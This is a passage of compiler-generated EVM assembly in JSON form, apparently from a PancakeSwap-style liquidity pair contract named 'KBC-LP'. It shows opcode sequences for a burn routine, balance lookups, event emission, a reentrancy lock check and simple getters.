											"begin": 8758,
											"end": 8789,
											"name": "tag",
											"value": "241"
										},
										{
											"begin": 8758,
											"end": 8789,
											"name": "JUMPDEST"
										},
										{
											"begin": 8799,
											"end": 8834,
											"name": "PUSH [tag]",
											"value": "243"
										},
										{
											"begin": 8813,
											"end": 8820,
											"name": "DUP8"
										},
										{
											"begin": 8822,
											"end": 8824,
											"name": "DUP14"
										},
										{
											"begin": 8826,
											"end": 8833,
											"name": "DUP14"
										},
										{
											"begin": 8799,
											"end": 8812,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 8799,
											"end": 8834,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8799,
											"end": 8834,
											"name": "tag",
											"value": "243"
										},
										{
											"begin": 8799,
											"end": 8834,
											"name": "JUMPDEST"
										},
										{
											"begin": 8844,
											"end": 8879,
											"name": "PUSH [tag]",
											"value": "244"
										},
										{
											"begin": 8858,
											"end": 8865,
											"name": "DUP7"
										},
										{
											"begin": 8867,
											"end": 8869,
											"name": "DUP14"
										},
										{
											"begin": 8871,
											"end": 8878,
											"name": "DUP13"
										},
										{
											"begin": 8844,
											"end": 8857,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 8844,
											"end": 8879,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8844,
											"end": 8879,
											"name": "tag",
											"value": "244"
										},
										{
											"begin": 8844,
											"end": 8879,
											"name": "JUMPDEST"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "DUP1"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "DUP2"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "MSTORE"
										},
										{
											"begin": 8934,
											"end": 8938,
											"name": "ADDRESS"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "DUP3"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "ADD"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "MSTORE"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SWAP1"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8900,
											"end": 8925,
											"name": "DUP10"
										},
										{
											"begin": 8900,
											"end": 8925,
											"name": "AND"
										},
										{
											"begin": 8900,
											"end": 8925,
											"name": "SWAP2"
										},
										{
											"begin": 8900,
											"end": 8925,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 8900,
											"end": 8925,
											"name": "SWAP2"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "DUP1"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "DUP4"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "ADD"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SWAP3"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SWAP3"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SWAP2"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SWAP1"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "DUP3"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SWAP1"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SUB"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "ADD"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "DUP2"
										},
										{
											"begin": 8900,
											"end": 8925,
											"name": "DUP7"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "DUP1"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "245"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "245"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "POP"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "GAS"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "STATICCALL"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "246"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "246"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "POP"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "POP"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "POP"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "POP"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "MLOAD"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "247"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "247"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "MLOAD"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "DUP1"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "DUP2"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "MSTORE"
										},
										{
											"begin": 8995,
											"end": 8999,
											"name": "ADDRESS"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "DUP3"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "ADD"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "MSTORE"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "SWAP1"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "MLOAD"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SWAP2"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SWAP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8961,
											"end": 8986,
											"name": "DUP9"
										},
										{
											"begin": 8961,
											"end": 8986,
											"name": "AND"
										},
										{
											"begin": 8961,
											"end": 8986,
											"name": "SWAP2"
										},
										{
											"begin": 8961,
											"end": 8986,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 8961,
											"end": 8986,
											"name": "SWAP2"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "DUP1"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "DUP3"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "ADD"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "SWAP3"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8900,
											"end": 8940,
											"name": "SWAP3"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "SWAP1"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "SWAP2"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "SWAP1"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "DUP3"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "SWAP1"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "SUB"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "ADD"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "DUP2"
										},
										{
											"begin": 8961,
											"end": 8986,
											"name": "DUP7"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "DUP1"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "248"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "248"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "POP"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "GAS"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "STATICCALL"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "249"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "249"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "POP"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "POP"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "POP"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "POP"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "MLOAD"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "250"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "250"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "MLOAD"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 9012,
											"end": 9061,
											"name": "PUSH [tag]",
											"value": "251"
										},
										{
											"begin": 9020,
											"end": 9028,
											"name": "DUP6"
										},
										{
											"begin": 8961,
											"end": 9001,
											"name": "DUP6"
										},
										{
											"begin": 9040,
											"end": 9049,
											"name": "DUP12"
										},
										{
											"begin": 9051,
											"end": 9060,
											"name": "DUP12"
										},
										{
											"begin": 9012,
											"end": 9019,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 9012,
											"end": 9061,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 9012,
											"end": 9061,
											"name": "tag",
											"value": "251"
										},
										{
											"begin": 9012,
											"end": 9061,
											"name": "JUMPDEST"
										},
										{
											"begin": 9075,
											"end": 9080,
											"name": "DUP2"
										},
										{
											"begin": 9071,
											"end": 9118,
											"name": "ISZERO"
										},
										{
											"begin": 9071,
											"end": 9118,
											"name": "PUSH [tag]",
											"value": "252"
										},
										{
											"begin": 9071,
											"end": 9118,
											"name": "JUMPI"
										},
										{
											"begin": 9109,
											"end": 9117,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 9109,
											"end": 9117,
											"name": "SLOAD"
										},
										{
											"begin": 9090,
											"end": 9118,
											"name": "PUSH [tag]",
											"value": "253"
										},
										{
											"begin": 9090,
											"end": 9118,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 9095,
											"end": 9103,
											"name": "DUP1"
										},
										{
											"begin": 9095,
											"end": 9103,
											"name": "DUP3"
										},
										{
											"begin": 9095,
											"end": 9103,
											"name": "AND"
										},
										{
											"begin": 9095,
											"end": 9103,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 9109,
											"end": 9117,
											"name": "SWAP1"
										},
										{
											"begin": 9109,
											"end": 9117,
											"name": "DIV"
										},
										{
											"begin": 9109,
											"end": 9117,
											"name": "AND"
										},
										{
											"begin": 9090,
											"end": 9118,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 9090,
											"end": 9108,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 9090,
											"end": 9118,
											"name": "AND"
										},
										{
											"begin": 9090,
											"end": 9118,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 9090,
											"end": 9118,
											"name": "tag",
											"value": "253"
										},
										{
											"begin": 9090,
											"end": 9118,
											"name": "JUMPDEST"
										},
										{
											"begin": 9082,
											"end": 9087,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 9082,
											"end": 9118,
											"name": "SSTORE"
										},
										{
											"begin": 9071,
											"end": 9118,
											"name": "tag",
											"value": "252"
										},
										{
											"begin": 9071,
											"end": 9118,
											"name": "JUMPDEST"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "DUP1"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "MLOAD"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "DUP13"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "DUP2"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "MSTORE"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "DUP2"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "ADD"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "DUP13"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "SWAP1"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "MSTORE"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "DUP2"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "DUP16"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "AND"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "SWAP3"
										},
										{
											"begin": 9178,
											"end": 9188,
											"name": "CALLER"
										},
										{
											"begin": 9178,
											"end": 9188,
											"name": "SWAP3"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "PUSH",
											"value": "DCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "SWAP3"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "SWAP1"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "DUP2"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "SWAP1"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "SUB"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "SWAP1"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "SWAP2"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "ADD"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "SWAP1"
										},
										{
											"begin": 9173,
											"end": 9211,
											"name": "LOG3"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1357,
											"end": 1358,
											"name": "POP"
										},
										{
											"begin": 1379,
											"end": 1380,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1368,
											"end": 1376,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1368,
											"end": 1380,
											"name": "DUP2"
										},
										{
											"begin": 1368,
											"end": 1380,
											"name": "SWAP1"
										},
										{
											"begin": 1368,
											"end": 1380,
											"name": "SSTORE"
										},
										{
											"begin": 1368,
											"end": 1380,
											"name": "POP"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SWAP2"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "POP"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "SWAP2"
										},
										{
											"begin": 7789,
											"end": 9218,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "tag",
											"value": "96"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "AND"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 438,
											"end": 508,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "tag",
											"value": "98"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "JUMPDEST"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "MLOAD"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP1"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "ADD"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "MSTORE"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP1"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP2"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "MSTORE"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B42432D4C5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "D4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP2"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "MSTORE"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "POP"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "DUP2"
										},
										{
											"begin": 262,
											"end": 302,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "tag",
											"value": "105"
										},
										{
											"begin": 3005,
											"end": 3144,
											"name": "JUMPDEST"
										},
										{
											"begin": 3068,
											"end": 3072,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3084,
											"end": 3116,
											"name": "PUSH [tag]",
											"value": "182"
										},
										{
											"begin": 3094,
											"end": 3104,
											"name": "CALLER"
										},
										{
											"begin": 3106,
											"end": 3108,
											"name": "DUP5"
										},
										{
											"begin": 3110,
											"end": 3115,
											"name": "DUP5"
										},
										{
											"begin": 3084,
											"end": 3093,
											"name": "PUSH [tag]",
											"value": "190"
										},
										{
											"begin": 3084,
											"end": 3116,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 515,
											"end": 563,
											"name": "tag",
											"value": "107"
										},
										{
											"begin": 515,
											"end": 563,
											"name": "JUMPDEST"
										},
										{
											"begin": 556,
											"end": 563,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 515,
											"end": 563,
											"name": "DUP2"
										},
										{
											"begin": 515,
											"end": 563,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "tag",
											"value": "110"
										},
										{
											"begin": 17828,
											"end": 18249,
											"name": "JUMPDEST"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "SLOAD"
										},
										{
											"begin": 1304,
											"end": 1305,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1292,
											"end": 1305,
											"name": "EQ"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH [tag]",
											"value": "257"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPI"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SUB"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "REVERT"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "tag",
											"value": "257"
										},
										{
											"begin": 1284,
